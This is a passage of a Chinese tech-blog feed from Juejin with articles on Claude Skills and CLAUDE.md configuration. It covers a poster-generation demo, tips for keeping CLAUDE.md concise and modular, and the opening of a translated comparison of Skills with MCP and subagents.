<li>打开命令行（CMD），进入你的项目目录。</li>
<li>输入命令启动 Claude。</li>
<li>你可以问它：“你现在有哪些 Skills？”</li>
</ol>
<p>这时候 AI 就会扫描目录，告诉你：“我已经加载了绘图技能、文件操作技能……”</p>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f2e5550fa5284c499b09422b3cbab8ae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeS4reaWh-ekvue-pA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769089808&amp;x-signature=9hH5aXdpp3CoF7P12pwcYZJGHhE%3D" alt="" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-7">🖼️ 效果展示：一句话生成海报</h2>
<p>咱们来测试一下。在命令行输入：</p>
<blockquote>
<p>“帮我制作一个茶壶的商品海报。”</p>
</blockquote>
<p>AI 会分析你的指令，发现需要调用 <code>canvas</code>（绘图设计）这个 Skill。它会询问你是否确认执行，你按下回车，后台的 Python 脚本就开始疯狂运转。</p>
<p>片刻之后，海报直接出现在你的文件夹里！甚至连设计理念、Markdown 说明文档都给你配齐了。</p>
<hr/>
<h2 data-id="heading-8">💡 为什么你一定要学会用 Skills？</h2>

<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/433ce61fe63e4eaea96212ecd0fdf494~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeS4reaWh-ekvue-pA==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769089808&amp;x-signature=CRQtsS9I9svpOcbMxmQpq83svBQ%3D" alt="" loading="lazy"/></p>
<p>相比于传统的满屏堆 Prompt，Skills 有两个无法拒绝的优势：</p>
<ol>
<li><strong>全局通用，省时省力：</strong> 你可以把 Skill 设置成项目级别或全局通用。不需要每次聊天都复制一大段长长的提示词，AI 看到指令自动触发，非常丝滑。</li>
<li><strong>能力扩展，突破上限：</strong> 很多复杂任务（如处理表格、批量重命名、自动化绘图），光靠提示词是搞不定的。Skills 允许加入代码附件，极大地扩展了 AI 的能力边界。</li>
</ol>
<p><strong>总结一下：Skills 就是把“提示词”+“执行脚本”+“上下文优化”打包在一起的超级工具包。</strong></p>
<p>学会了它，你才算真正解锁了 AI Agent 的正确打开方式！</p>
<hr/>
<p><strong>我是磊哥，每天为你分享一个 AI 干货！如果你对如何编写自己的 Skill 感兴趣，欢迎点赞告诉我，后期咱们出一期详细的进阶教程！</strong></p>
<blockquote>
<p>本文已收录到我的技术小站 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.javacn.site" target="_blank" title="https://www.javacn.site" ref="nofollow noopener noreferrer">www.javacn.site</a>，网站包含的内容有：<strong>N8N/Coze/Dify/LangChain/SpringAI/SpringAIAlibaba/LangChain4j/AI实战项目/AI常见面试题</strong>等技术分享，欢迎各位大佬光临指导~</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[CLAUDE.md 全方位指南：构建高效 AI 开发上下文]]></title>    <link>https://juejin.cn/post/7595414148487069736</link>    <guid>https://juejin.cn/post/7595414148487069736</guid>    <pubDate>2026-01-15T12:11:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595414148487069736" data-draft-id="7595400254347509775" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="CLAUDE.md 全方位指南：构建高效 AI 开发上下文"/> <meta itemprop="keywords" content="Claude,VibeCoding"/> <meta itemprop="datePublished" content="2026-01-15T12:11:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序猿DD"/> <meta itemprop="url" content="https://juejin.cn/user/131597123993358"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            CLAUDE.md 全方位指南：构建高效 AI 开发上下文
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/131597123993358/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序猿DD
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T12:11:53.000Z" title="Thu Jan 15 2026 12:11:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>如果你是 Claude 的日常用户，你一定熟悉这个场景：每次开启一个新的对话，都必须不厌其烦地重复设置项目背景、编码规范和特定的指令。这不仅耗时，也容易出错。当你忘记提醒某个关键细节时，就不得不花更多时间去修复那些不符合规范的代码。</p>
<p>CLAUDE.md 文件正是解决这一痛点的关键。它就像 Claude 的项目专属记忆，让 AI 在每次对话开始前自动加载并记住你的所有偏好。这是一个简单而强大的功能，但大多数用户仅仅停留在基础层面。</p>
<p>事实上，要真正释放 CLAUDE.md 的威力，需要掌握一些更深刻、甚至有些违反直觉的技巧。本文将为你揭示其中最关键的五个，帮助你将这个简单的配置文件，转变为一个能够持续进化的项目知识库。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fbe1de8337994907a3c7c446136c3e23~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56iL5bqP54y_REQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769083913&amp;x-signature=YIOAApWZQsNw3AwDw6P%2FQA4sw6o%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">1. 你的 CLAUDE.md 应该是一个“活的文档”，而不是“一次性配置”</h2>
<p>许多人认为 CLAUDE.md 文件只需在项目开始时配置一次，然后就可以置之不理。这是一个巨大的误区。最有效的 CLAUDE.md 应该随着项目的演进而持续更新和优化。</p>
<p>最佳的维护方式是在日常工作中“有机地”构建它。例如，当 Claude 做出了一个需要纠正的假设——比如它建议使用 console.log 进行调试，而你的团队规范是使用特定的日志库——不要只是临时修正。直接告诉 Claude：“将‘总是使用日志库而不是 console.log’这条规则添加到我的 CLAUDE.md 文件中。” 这样，你的修正就会沉淀下来，在未来的所有会话中生效。值得注意的是，早期版本的 Claude 有一个 # 快捷键来添加指令，但在 2.0.70 版本后已被移除。目前，直接请求 Claude 进行修改是官方推荐的最佳实践。</p>
<p>这种做法的价值在于，它能实时捕捉并固化工作流程中的隐性知识。正如一个精妙的比喻所说：</p>
<p>这就像在会议中做笔记，不同的是，这些笔记真的会被使用。</p>
<p>更高级的维护方法是将其与团队协作流程结合。在代码审查（Code Review）中发现的未被文档化的规范，正是更新 CLAUDE.md 的绝佳时机。一个由 Boris Cherny 分享的高效工作流是：通过 GitHub Action，你甚至可以直接在 PR 评论中 @claude，让它将新规范添加到 CLAUDE.md 文件中。这创建了一个强大的反馈循环，将团队的集体智慧源源不断地沉淀到这个核心文件中。</p>
<h2 data-id="heading-1">2. 少即是多：上下文是宝贵资源，精简至上</h2>
<p>人们普遍认为，提供给 AI 的上下文越多，结果就越好。然而在使用 CLAUDE.md 时，这个直觉可能是错误的。</p>
<p>核心论点是：“上下文是宝贵的（Context is precious）”。CLAUDE.md 中的每一行内容，都在与你当前的工作指令竞争 AI 的注意力。一个臃肿、充满冗余信息的文件，反而可能稀释掉最关键的指令，导致 AI 抓不住重点。
因此，精简至上。一个很好的起点是使用 /init 命令，它会根据你的项目结构和技术栈生成一个初始文件。我的建议是，以此为基础，然后删除所有你不需要的内容。从现有内容中删除比从零开始创建要容易得多。</p>
<p>一般建议将文件长度保持在 300 行以下。当然，这并非硬性规定。对于一些具有复杂约定或非寻常模式的 codebase，一个更长的 CLAUDE.md 反而能通过预先加载足够的上下文，有效防止 Claude 做出错误假设。关键在于，文件中的每一行都应该有其明确的价值。毫不留情地删除那些显而易见的废话（例如“请编写高质量代码”）或没有实际指导意义的“填充”信息。</p>
<p>精简的 CLAUDE.md 迫使你仔细思考并只保留最重要的指令。这不仅能节省宝贵的上下文空间，更能确保 AI 在处理你的请求时，能够更准确地聚焦于核心要求，而不是在大量无关信息中迷失方向。</p>
<h2 data-id="heading-2">3. 超越单个文件：用模块化结构管理复杂性</h2>
<p>许多用户只知道在项目根目录下创建一个 CLAUDE.md 文件。这对于小型项目来说足够了，但对于大型或结构复杂的项目，存在着更优雅、更强大的模块化管理方式。</p>
<ul>
<li>@imports 语法 你可以使用 @path/to/file 语法，从主 CLAUDE.md 文件中引用其他文件的内容。这能让主文件保持简洁，同时将详细的规范拆分到独立的文档中。例如，你可以将复杂的 API 设计模式放在 docs/api-patterns.md 中，然后在主文件里用 @docs/api-patterns.md 引用它。</li>
<li>.claude/rules/ 目录 这是一个非常适合大型团队的结构。所有放在 .claude/rules/ 目录下的 .md 文件都会被 Claude 自动加载，无需手动 @import。这使得不同领域的团队可以独立维护各自的规则文件，例如，前端团队维护 code-style.md，安全团队维护 security.md。大家各司其职，有效避免了在单个大文件中频繁产生合并冲突。</li>
<li>子目录中的 CLAUDE.md 对于 Monorepo（单一代码库）项目，这是一个绝佳的解决方案。你可以在项目的特定子目录（例如 api/ 或 packages/ui/）中放置 CLAUDE.md 文件。这些文件非常特殊：它们并不会在会话启动时加载，而只在 Claude 主动处理该特定子目录中的内容时才会被包含进来。这使得你可以为项目的不同模块定义截然不同的规范，实现真正精细化的上下文管理。
• 个人配置 CLAUDE.local.md 还有一个关键文件：CLAUDE.local.md。它用于存放那些不应提交到版本控制中的个人偏好，例如你习惯的编辑器 quirks 或偏好的代码冗余度。由于这是个人专属的，请务必将其添加到 .gitignore 文件中，以避免将个人配置泄露给整个团队。</li>
</ul>
<h2 data-id="heading-3">4. 魔鬼在细节中：文件名是区分大小写的</h2>
<p>这是一个极其微小但至关重要的技术细节，也是最容易被忽略的陷阱之一：CLAUDE.md 这个文件名是区分大小写的。</p>
<p>正确的文件名必须是“CLAUDE.md”——CLAUDE 部分为大写，.md 扩展名为小写。如果你将其命名为 claude.md、Claude.md 或其他任何变体，Claude 的系统将无法识别并加载它。</p>
<p>这个细节之所以重要，是因为它是一个典型的“陷阱”（gotcha）。有趣的是，这一点在官方文档中并未明确说明。我是通过询问官方文档的 AI 助手才最终确认了这一规则。一旦出错，你可能会花费大量时间排查为什么自己精心编写的指令完全没有生效，最终才发现问题出在一个简单的大小写错误上。这个看似微不足道的细节，恰恰体现了与 AI 高效协作时，精确配置的重要性。</p>
<h2 data-id="heading-4">5. 让 AI 优化 AI：定期请 Claude 审查自己的“说明书”</h2>
<p>这是一个非常巧妙的“元认知”技巧：定期让 Claude 自己来审查和优化它的“说明书”——CLAUDE.md 文件。</p>
<p>随着时间的推移，CLAUDE.md 中不可避免地会积累一些过时、冗余甚至相互冲突的指令。通过一个简单的提示，例如“请审查这个 CLAUDE.md 文件，并提出改进建议以使其更清晰、更高效”，你可以利用 Claude 自身的能力来发现这些问题。它可能会建议你合并重复的规则，或澄清模糊的表述。</p>
<p>对于那些绝对不能违反的关键规则，你可以使用强调词来引起 Claude 的注意，比如 IMPORTANT: 或 YOU MUST。这能提高 Claude 遵循这些指令的概率，但请务必谨慎使用。正如一句古老的建议所说：如果所有东西都被标记为重要，那就没有什么是重要的了。</p>
<p>诚然，这需要一些维护成本，但其回报是巨大的。正如源文所说：
这听起来像是维护开销。确实是。但它比在每个会话中重复自己的话，或修复那些忽略了你的规范的代码要省事得多。</p>
<p>这不仅仅是一种文件维护策略，更是一种与 AI 协作的新范式。我们不再仅仅是 AI 的使用者，更是其成长过程中的引导者，让工具本身参与到自我完善的流程中，形成一个持续改进的良性循环。</p>
<h2 data-id="heading-5">结论</h2>
<p>CLAUDE.md 远不止一个简单的配置文件。通过本文分享的五个高级技巧——将其视为活文档、保持精简、模块化管理、注意大小写，以及让 AI 自我优化——你可以将其从一个静态的指令列表，转变为一个强大的、与项目共同成长的动态知识库。</p>
<p>这些策略代表了一种更深层次的思维方式：将你的 AI 上下文本身视为一个“代码库”。它也需要像代码一样被重构、被审查、被持续改进。你的 CLAUDE.md 值得你如此对待。现在，不妨思考一下：你的 CLAUDE.md 中沉淀了多少团队智慧？或许，现在就是开始构建它的最佳时机。</p>
<p>更多关于Vibe Coding的内容也可关注<a href="https://link.juejin.cn?target=https%3A%2F%2Fdidispace.com" target="_blank" title="https://didispace.com" ref="nofollow noopener noreferrer">我的博客</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【译】Skills 详解：Skills 与 prompts、Projects、MCP 和 subagents 的比较]]></title>    <link>https://juejin.cn/post/7595142651728494611</link>    <guid>https://juejin.cn/post/7595142651728494611</guid>    <pubDate>2026-01-15T12:27:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595142651728494611" data-draft-id="7595178023256997907" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【译】Skills 详解：Skills 与 prompts、Projects、MCP 和 subagents 的比较"/> <meta itemprop="keywords" content="人工智能,AIGC"/> <meta itemprop="datePublished" content="2026-01-15T12:27:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="狼爷"/> <meta itemprop="url" content="https://juejin.cn/user/2418581314208279"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【译】Skills 详解：Skills 与 prompts、Projects、MCP 和 subagents 的比较
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2418581314208279/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    狼爷
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T12:27:40.000Z" title="Thu Jan 15 2026 12:27:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body 